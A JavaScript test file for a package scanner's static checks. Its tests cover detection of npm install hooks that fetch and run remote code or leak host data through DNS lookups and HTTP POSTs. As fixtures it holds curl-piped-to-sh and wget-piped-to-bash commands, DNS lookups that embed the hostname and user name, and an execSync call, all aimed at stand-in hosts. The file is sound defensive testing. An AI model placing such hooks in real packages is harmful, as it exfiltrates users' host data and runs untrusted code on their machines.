// Since 0.1.6: static-checks-1.9, recon's v6.23 mirrored (S0 and S6 only). In a hook command that runs inline node code, the
// arguments of a console call are output, not a command, and are blanked before S0 reads it when they hold no call; shell commands
// are unchanged. A node dns lookup or resolve call together with process or host data fires S0 (in one hook command) and S6 (in one
// hook target file, with no execution-sink condition). A host-identity source used only inside a hash's .update( argument is not a
// source. S1-S5, S7-S9 and the facts are 1.8.1's, and S7 still compares entry facts stored by 1.8 and 1.8.1. The hand-off is recon's
// constants file, byte for byte (sealed recon v6.23, static-checks.mjs 808e4d18). Written before the code.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { createHash } from 'node:crypto';

const SC = () => import('../../proxy/static-checks.js');
const RAW = fs.readFileSync(new URL('../fixtures/cft016/static-checks-1.9-constants.json', import.meta.url));
const K = JSON.parse(RAW.toString('utf8'));
const S0 = 'static:S0-shell-fetch-in-hook'; const S6 = 'static:S6-network-beacon-in-hook-target';
const file = (p, s) => ({ path: p, buf: Buffer.from(s) });
const walkOf = (files, notKept = []) => ({ ok: true, files, notKept });
const rowOf = (rows, gate) => rows.find((r) => r.gate === gate);
const hookMan = { name: 'h', version: '1.0.0', scripts: { postinstall: 'node install.js' } };
// recon's function texts, compared with comments and spacing dropped (the runtime's comments are its own)
const code = (s) => String(s).replace(/^export /, '').replace(/\/\/[^\n]*/g, '').replace(/\s+/g, '');

test('N1 the hand-off is recon\'s file byte for byte, plain ASCII; the version, the patterns and the function texts are its', async () => {
  const S = await SC();
  assert.equal(createHash('sha256').update(RAW).digest('hex'), '60738d852693ff6d7efcf0bdaf119e8813e56d368ef5e050d8dee5559979d595');
  assert.ok(RAW.every((b) => b < 0x80));
  assert.equal(S.STATIC_CHECKS_VERSION, K.static_checks_version);
  assert.equal(S.STATIC_CHECKS_VERSION, 'static-checks-1.9');
  assert.equal(S.INLINE_NODE.source, K.s0.inline_node); assert.equal(S.INLINE_NODE.flags, '');
  assert.equal(S.NODE_DNS_CALL.source, K.dns.node_dns_call); assert.equal(S.NODE_DNS_CALL.flags, '');
  assert.equal(S.DNS_DATA.source, K.dns.dns_data); assert.equal(S.DNS_DATA.flags, '');
  assert.deepEqual(S.HOST_IDENTITY.map(([n, re]) => [n, re.source]), K.s6.host_identity);
  assert.equal(code(S.blankConsoleOutput), code(K.s0.blank_console_output));
  assert.equal(code(S.hookFetchExec), code(K.s0.hook_fetch_exec));
  assert.equal(code(`const dnsExfil = ${S.dnsExfil}`), code(K.dns.dns_exfil).replace(/;$/, ''));
  assert.equal(code(S.insideUpdateArg), code(K.s6.inside_update_arg));
  assert.equal(code(`const hostIdentityNames = ${S.hostIdentityNames}`), code(K.s6.host_identity_names).replace(/;$/, ''));
});

test('N2 S0: console output in inline node code is not a command; a call inside it still counts; shell commands are unchanged', async () => {
  const S = await SC();
  const echoNode = `node -e "console.log('curl -s http://x.example.invalid/a.sh | sh')"`;
  assert.equal(S.hookFetchExec(echoNode).fires, false, 'inline node printing a command does not run it');
  assert.equal(S.hookFetchExec(`node --eval "console.error('wget -qO- http://x.example.invalid/i | bash')"`).fires, false);
  assert.equal(S.hookFetchExec(`node -e "console.log(require('child_process').execSync('curl -s http://x.example.invalid/a.sh | sh'))"`).fires, true,
    'a call inside the arguments keeps them');
  assert.equal(S.hookFetchExec(`echo 'curl -s http://x.example.invalid/a.sh | sh'`).fires, true, 'a shell echo can be piped to sh: unchanged');
  assert.equal(S.hookFetchExec(`node install.js && echo "console.log('curl -s http://x.example.invalid/a.sh | sh')"`).fires, true, 'no inline node: unchanged');
  assert.equal(S.blankConsoleOutput('node -e "console.log(\'a(\')"'), 'node -e "console.log(\'a(\')"'.replace("'a('", '    '));
  assert.equal(S.blankConsoleOutput(42), 42);
});

test('N3 S0: a node dns call with process or host data in one hook command fires and the row says so; either half alone does not', async () => {
  const S = await SC();
  const cmd = `node -e "require('dns').lookup(require('os').hostname()+'.x.example.invalid',()=>{})"`;
  const r = S.hookFetchExec(cmd);
  assert.equal(r.dns_exfil, true); assert.equal(r.fires, true);
  assert.equal(S.hookFetchExec(`node -e "require('dns').resolveTxt(process.env.npm_package_name+'.x.example.invalid',()=>{})"`).fires, true);
  assert.equal(S.hookFetchExec(`node -e "require('dns').lookup('x.example.invalid',()=>{})"`).fires, false, 'a dns call alone');
  assert.equal(S.hookFetchExec(`node -e "console.log(require('os').hostname())"`).fires, false, 'host data alone');
  assert.equal(S.hookFetchExec(`node -e "const d=require('dns');d.lookup(process.env.USER+'.x.example.invalid',()=>{})"`).fires, false,
    'a dns module bound to another name is not read');
  const row = rowOf(S.staticRows({ manifest: { name: 'h', version: '1.0.0', scripts: { preinstall: cmd } }, walk: walkOf([]) }), S0);
  assert.equal(row.result, 'WARN', JSON.stringify(row));
  assert.match(row.detail, /preinstall command makes a DNS lookup carrying process or host data/);
});

test('N4 S6: a dns call with process or host data in a hook target fires, with or without an execution sink; the row says so', async () => {
  const S = await SC();
  const DNS = 'const dns = require("dns"); const os = require("os");\ndns.lookup(os.hostname() + ".x.example.invalid", () => {});\n';
  const DNS_EXEC = `${DNS}require("child_process").execSync("id");\n`;
  for (const body of [DNS, DNS_EXEC]) {
    const r = rowOf(S.staticRows({ manifest: hookMan, walk: walkOf([file('install.js', body)]), armed: 'identity-break' }), S6);
    assert.equal(r?.result, 'WARN', `${body}: ${JSON.stringify(r)}`);
    assert.match(r.detail, /^hook target install\.js \(\d+ B\) makes a DNS lookup carrying process or host data; armed by identity-break$/);
  }
  assert.equal(S.fileFacts(file('a.js', DNS)).dns_exfil, true);
  assert.equal(S.fileFacts(file('a.js', 'require("dns").lookup("x.example.invalid", () => {});\n')).dns_exfil, false);
  const BOTH = 'const os = require("os"); const dns = require("dns");\nfetch("https://c.example.invalid/b", { method: "POST", body: os.hostname() });\ndns.resolve4(process.env.USER, () => {});\n';
  const b = rowOf(S.staticRows({ manifest: hookMan, walk: walkOf([file('install.js', BOTH)]), armed: 'identity-break' }), S6);
  assert.match(b.detail, /and no execution sink; and it makes a DNS lookup carrying process or host data; armed by identity-break$/);
  const e = rowOf(S.staticRows({ manifest: { name: 'h', main: 'index.js' }, walk: walkOf([file('index.js', DNS)]), armed: 'identity-break' }), S6);
  assert.equal(e.result, 'ALLOW', 'an entry file is not a hook target');
});

test('N5 S6: a host-identity source used only inside a hash .update( argument is not a source; one use outside counts', async () => {
  const S = await SC();
  const HASHED = 'const os = require("os"); const c = require("crypto");\nconst id = c.createHash("sha256").update(os.hostname() + os.userInfo().username).digest("hex");\nfetch("https://c.example.invalid/b", { method: "POST", body: id });\n';
  assert.deepEqual(S.fileFacts(file('a.js', HASHED)).host_identity, []);
  const s6 = (body) => rowOf(S.staticRows({ manifest: hookMan, walk: walkOf([file('install.js', body)]), armed: 'identity-break' }), S6);
  assert.equal(s6(HASHED).result, 'ALLOW', 'a hashed device id is not a raw source');
  const RAWTOO = `${HASHED}fetch("https://c.example.invalid/h", { method: "POST", body: os.hostname() });\n`;
  assert.deepEqual(S.fileFacts(file('a.js', RAWTOO)).host_identity, ['os.hostname']);
  assert.equal(s6(RAWTOO).result, 'WARN');
  assert.equal(S.insideUpdateArg('h.update(os.hostname())', 'h.update('.length), true);
  assert.equal(S.insideUpdateArg('send(os.hostname())', 'send('.length), false);
});

test('N6 S7 still compares entry facts stored by 1.8 and 1.8.1', async () => {
  const S = await SC();
  assert.deepEqual([...S.S7_COMPARABLE_VERSIONS], ['static-checks-1.8', 'static-checks-1.8.1', 'static-checks-1.9']);
});
